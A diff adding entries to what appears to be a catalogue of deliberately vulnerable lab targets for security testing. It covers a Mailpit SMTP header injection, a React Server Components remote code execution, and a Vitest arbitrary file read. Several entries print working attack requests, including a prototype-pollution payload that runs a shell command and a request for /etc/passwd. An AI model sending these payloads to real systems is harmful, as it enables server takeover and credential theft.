@@ -1,6 +1,197 @@
 [
   {
+    "id": "vt-2026-23829",
+    "info": {
+      "name": "mailpit - Mailpit has an SMTP Header Injection via Regex Bypass",
+      "author": "omarkurt",
+      "description": "Mailpit is an email testing tool and API for developers. Prior to version 1.28.3, Mailpit's SMTP server is vulnerable to Header Injection due to an insufficient Regular Expression used to validate `RCPT TO` and `MAIL FROM` addresses. An attacker can inject arbitrary SMTP headers (or corrupt existing ones) by including carriage return characters (`\\r`) in the email address. This header injection occurs because the regex intended to filter control characters fails to exclude `\\r` and `\\n` when used inside a character class. Version 1.28.3 fixes this issue.\n",
+      "targets": [
+        "mailpit",
+        "web",
+        "SMTP"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2026-23829",
+      "cwe": "CWE-150",
+      "cvss": {
+        "score": 5.3,
+        "severity": "medium"
+      },
+      "affected_versions": [
+        "<= 1.28.2"
+      ],
+      "tags": [
+        "go",
+        "medium",
+        "cve-2026",
+        "mailpit",
+        "header-injection",
+        "smtp",
+        "network"
+      ],
+      "references": [
+        "https://github.com/axllent/mailpit/commit/36cc06c125954dec6673219dafa084e13cc14534",
+        "https://github.com/axllent/mailpit/releases/tag/v1.28.3",
+        "https://github.com/axllent/mailpit/security/advisories/GHSA-54wq-72mp-cq7c",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-23829",
+        "https://github.com/advisories/GHSA-54wq-72mp-cq7c",
+        "https://vulnerabletarget.com/VT-2026-23829"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "SMTP",
+      "method": "MAIL FROM / RCPT TO",
+      "request": "EHLO example.com\nMAIL FROM:<attacker@example.com>\nRCPT TO:<victim\\rX-Injected:true@example.com>\nDATA\n...\n",
+      "response": "250 Ok\n(Header injected in received email)\n"
+    },
+    "technical": "SMTP Header Injection via insufficient regex in address validation.\nFile: internal/smtp/session.go\n\nThe regex pattern used to validate MAIL FROM and RCPT TO addresses:\n  var (\n    addressRegex = regexp.MustCompile(`[^\\x00-\\x1f]+`)  // Flawed regex\n  )\n\nThe regex fails to properly exclude carriage return (\\r, 0x0D) and\nline feed (\\n, 0x0A) characters when used inside a negated character class.\nThis allows an attacker to inject arbitrary SMTP headers by including\nbare CR characters in the email address.\n\nPayload: MAIL FROM:<attacker\\rX-Pwned:injected>\nThe \\r (0x0D) breaks out of the address and injects a new header line.\n",
+    "impact": "Attackers can inject arbitrary SMTP headers into emails processed by Mailpit.\nThis could lead to:\n- Email spoofing and phishing attacks\n- Bypassing spam filters\n- Corrupting email metadata\n- Potential email routing manipulation\n",
+    "remedy": "Update Mailpit to version 1.28.3 or later.\nThe fix properly validates email addresses using RFC-compliant parsing\ninstead of a flawed regex pattern.\n",
+    "poc": {
+      "nuclei": [
+        "vt-2026-23829-inject.yaml",
+        "vt-2026-23829-verify.yaml",
+        "vt-2026-23829-workflow.yaml"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml",
+        "ports": [
+          1025,
+          8025
+        ]
+      }
+    },
+    "post-install": [
+      "Access Mailpit UI at http://localhost:8025",
+      "SMTP Service available at localhost:1025",
+      "No authentication required",
+      "Use vt-2026-23829-inject.yaml to send a test email with header injection payload",
+      "Use vt-2026-23829-verify.yaml to check for the injected header in the received email",
+      "or run vt-2026-23829-workflow.yaml to execute both steps in sequence"
+    ],
+    "category": "cves",
+    "added_date": "2026-02-07T09:07:50+03:00"
+  },
+  {
+    "id": "vt-2025-55182",
+    "info": {
+      "name": "React Server Components - Remote Code Execution",
+      "author": "omarkurt",
+      "description": "React Server Components 19.0.0, 19.1.1, and 19.2.0 including react-server-dom-parcel,\nreact-server-dom-turbopack, and react-server-dom-webpack contain a remote code execution caused\nby unsafe deserialization of payloads from HTTP requests to Server Function endpoints.\n",
+      "targets": [
+        "react-server-components",
+        "nextjs"
+      ],
+      "type": "CVE",
+      "affected_versions": [
+        "React 19.0.0, 19.1.1, 19.2.0",
+        "Next.js < 15.0.4"
+      ],
+      "fixed_version": "React 19.2.1, Next.js 15.0.4",
+      "cve": "CVE-2025-55182",
+      "cwe": "CWE-502",
+      "cvss": {
+        "score": "10.0",
+        "metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "tags": [
+        "rce",
+        "deserialization",
+        "react",
+        "nextjs"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "/",
+      "method": "POST",
+      "param": "multipart/form-data",
+      "request": "POST / HTTP/1.1\nNext-Action: x\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"0\"\n\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\n...\n"
+    },
+    "technical": "Pre-authentication Remote Code Execution in React Server Components (RSC).\nExploits unsafe deserialization in Server Action response processing.\nAn attacker can pollute the object prototype and trigger arbitrary Node.js code\nexecution via the `_prefix` property in the RSC stream.\n",
+    "impact": "Total system compromise. An unauthenticated attacker can execute arbitrary\nsystem commands on the server with the privileges of the application process.\n",
+    "remedy": "Upgrade React to version 19.2.1 or higher.\nUpgrade Next.js to version 15.0.4 or higher.\n",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-55182",
+      "https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp",
+      "https://github.com/assetnote/react2shell-scanner",
+      "https://github.com/l4rm4nd/CVE-2025-55182"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2025-55182.nuclei.yaml"
+      ]
+    },
+    "remediation": [
+      "Update to React 19.2.1 or newer",
+      "Update to Next.js 15.0.4 or newer"
+    ],
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "category": "cves",
+    "added_date": "2026-02-07T09:07:50+03:00"
+  },
+  {
     "id": "vt-2025-24963",
+    "info": {
+      "name": "Vitest Browser Mode API Exposure (LFI & RCE) (CVE-2025-24963)",
+      "author": "omarkurt",
+      "description": "Vitest 3.0.0 and earlier vulnerable configurations allow unauthenticated access to the browser API when listening on all interfaces (0.0.0.0).\nThe `__screenshot-error` handler on the browser mode HTTP server responds with any file on the file system (LFI).\nAttackers can potentially execute arbitrary code or access sensitive system files.\n",
+      "targets": [
+        "vitest"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2025-24963",
+      "cwe": "CWE-22",
+      "cvss": {
+        "score": 9.8,
+        "severity": "critical"
+      },
+      "affected_versions": [
+        "<= 3.0.0"
+      ],
+      "tags": [
+        "lfi",
+        "rce",
+        "vitest",
+        "api-exposure"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "/__screenshot-error",
+      "method": "GET",
+      "param": "file",
+      "request": "GET /__screenshot-error?file=/etc/passwd HTTP/1.1\nHost: {{target}}\n",
+      "response": "HTTP/1.1 200 OK\nContent-Type: image/png\n\nroot:x:0:0:root:/root:/bin/bash\n...\n"
+    },
+    "technical": "The `__screenshot-error` handler in `@vitest/browser` (middleware) allows unauthenticated file reading.\nThe server exposes this endpoint when `ui: true` is enabled in `vitest.config.ts`.\nIt does not validate the `file` parameter properly, allowing traversal or direct absolute path access.\n",
+    "impact": "Attackers can read arbitrary files from the server (LFI), including source code, configuration files, and credentials.\nIn some configurations, interaction with the browser runner API may lead to Remote Code Execution (RCE).\n",
+    "remedy": "Upgrade to Vitest version 3.0.4 or later.\nRestrict Vitest to listen only on localhost (127.0.0.1).\nEnsure `ui: false` if external access is required for other reasons.\n",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-24963",
+      "https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5",
+      "https://github.com/projectdiscovery/nuclei-templates-labs/tree/main/http/cves/2025/CVE-2025-24963"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2025-24963.nuclei.yaml"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml",
+        "port": 63315
+      }
+    },
+    "category": "cves",
+    "added_date": "2026-02-07T09:07:50+03:00"
+  },
+  {
+    "id": "vt-2026-25512",
     "info": {
       "name": "Vitest Browser Mode API Exposure (LFI & RCE) (CVE-2025-24963)",
       "author": "omarkurt",
